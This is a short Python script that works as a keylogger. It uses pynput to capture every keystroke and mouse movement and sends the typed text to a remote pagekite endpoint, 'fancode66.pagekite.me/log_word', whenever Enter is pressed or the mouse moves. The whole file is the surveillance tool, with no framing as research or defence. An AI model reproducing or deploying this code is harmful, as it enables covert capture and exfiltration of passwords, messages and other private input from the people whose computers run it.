from pynput.keyboard import Key, Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import requests
import signal
import sys

url = 'https://fancode66.pagekite.me/log_word'
word = ""

def log_word():
    global word
    if word:
        data = {'word': word}
        try:
            r = requests.post(url, data=data)
            if r.status_code == 200:
                print(f"Word '{word}' sent successfully.")
            else:
                print(f"Failed to send word '{word}'.")
        except Exception as e:
            print(f"Error sending word '{word}': {e}")
        word = ''

def on_press(key):
    global word

    if key == Key.enter:
        log_word()
    elif key == Key.shift_l or key == Key.shift_r:
        return False
    elif key == Key.space:
        word += ' '
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        if len(char) > 1 and char[0] == "'" and char[-1] == "'":
            char = char[1:-1]
        word += char

    if key in [Key.esc, Key.alt_l, Key.tab, Key.down, Key.up, Key.left, Key.right, Key.ctrl_l]: 
        word += ' <>'
        return


def on_move(x, y):
    log_word()




with KeyboardListener(on_press=on_press) as k_listener, MouseListener(on_move=on_move) as m_listener:
    k_listener.join()
    m_listener.join()
